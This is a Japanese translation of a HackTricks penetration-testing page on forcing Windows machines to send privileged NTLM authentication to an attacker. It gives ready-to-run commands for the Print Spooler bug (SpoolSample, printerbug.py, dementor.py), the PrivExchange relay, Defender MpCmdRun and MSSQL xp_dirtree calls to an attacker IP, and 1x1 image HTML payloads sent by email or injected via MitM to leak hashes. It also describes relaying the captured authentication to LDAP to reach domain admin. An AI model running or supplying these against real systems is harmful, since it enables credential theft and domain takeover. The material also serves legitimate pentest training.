# NTLM特権認証を強制する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)は、サードパーティの依存関係を回避するために、C#とMIDLコンパイラを使用してコーディングされた**リモート認証トリガー**の**コレクション**です。

## スプーラーサービスの乱用

_**Print Spooler**_サービスが**有効**になっている場合、既知のAD資格情報を使用して、ドメインコントローラのプリントサーバーに新しい印刷ジョブの更新を要求し、通知を**いくつかのシステムに送信**することができます。\
プリンタが任意のシステムに通知を送信する場合、そのシステムに**認証する必要があります**。したがって、攻撃者は_**Print Spooler**_サービスを任意のシステムに対して認証させることができ、この認証ではサービスはこのコンピュータのアカウントを**使用**します。

### ドメイン上のWindowsサーバーの検索

PowerShellを使用して、Windowsボックスのリストを取得します。通常、サーバーが優先されるため、そこに焦点を当てましょう：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spoolerサービスのリスニングを見つける

@mysmartlogin（Vincent Le Toux）の[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)を若干変更して使用し、Spoolerサービスがリスニングしているかどうかを確認します。
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
あなたはLinux上でrpcdump.pyを使用することもできます。MS-RPRNプロトコルを探してください。
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 任意のホストに対してサービスに認証を要求する

[ここからSpoolSampleをコンパイルします](https://github.com/NotMedic/NetNTLMtoSilverTicket)。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、Linuxを使用している場合は、[**3xocyteのdementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用します。
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegationとの組み合わせ

もし攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)を利用してコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに認証させることができます**。Unconstrained Delegationにより、**プリンタのコンピュータアカウントのTGT**はUnconstrained Delegationを持つコンピュータの**メモリに保存されます**。攻撃者はすでにこのホストを侵害しているため、このチケットを**取得して悪用**することができます（[Pass the Ticket](pass-the-ticket.md)）。

## RCP Force authentication

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange`攻撃は、Exchange Serverの`PushSubscription`機能の欠陥に起因します。この欠陥により、メールボックスを持つ**任意のドメインユーザがExchangeサーバを強制的に認証させる**ことができます。認証はクライアントが提供する任意のホストを介してHTTP経由で行われます。

Exchangeサービスは**SYSTEM**として実行され、デフォルトで**特権が与えられています**（つまり、2019年以前の累積更新プログラムではドメインのWriteDacl特権を持っています）。この欠陥を利用して、LDAPにリレーしドメインのNTDSデータベースをダンプすることができます。LDAPにリレーできない場合でも、ドメイン内の**他のホスト**にリレーして認証することができます。この攻撃により、認証されたドメインユーザアカウントを使用して直接ドメイン管理者になることができます。

****[**この技術はここからコピーされました。**](https://academy.hackthebox.com/module/143/section/1276)****

## Windows内部

Windowsマシン内にすでにアクセスしている場合、特権アカウントを使用してWindowsをサーバに接続させることができます。

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQLは、Microsoft SQL Serverの略称です。これは、Microsoftが開発したリレーショナルデータベース管理システム（RDBMS）です。MSSQLは、Windowsプラットフォーム上で広く使用されており、企業や組織でのデータ管理に使用されています。MSSQLは、データの格納、クエリの実行、データのバックアップと復元など、さまざまなデータベース関連のタスクをサポートしています。MSSQLは、セキュリティ機能や高可用性オプションなど、さまざまな機能を提供しています。
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
または、この別のテクニックを使用することもできます：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

## HTMLインジェクション

### メール経由

侵害したいマシンにログインするユーザーの**メールアドレス**を知っている場合、単に1x1の画像を含む**メールを送信**することができます。
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
そして彼がそれを開くと、彼は認証を試みるでしょう。

### MitM

コンピュータに対してMitM攻撃を実行し、彼が視覚化する可能性のあるページにHTMLを注入できる場合、次のような画像をページに注入してみることができます：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1のクラック

[NTLMv1のチャレンジをキャプチャする方法](../ntlm/#ntlmv1-attack)を読んで、それらをクラックする方法を確認してください。\
_NTLMv1をクラックするには、Responderのチャレンジを「1122334455667788」に設定する必要があることを忘れないでください。_

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見してください。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksのリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudのリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
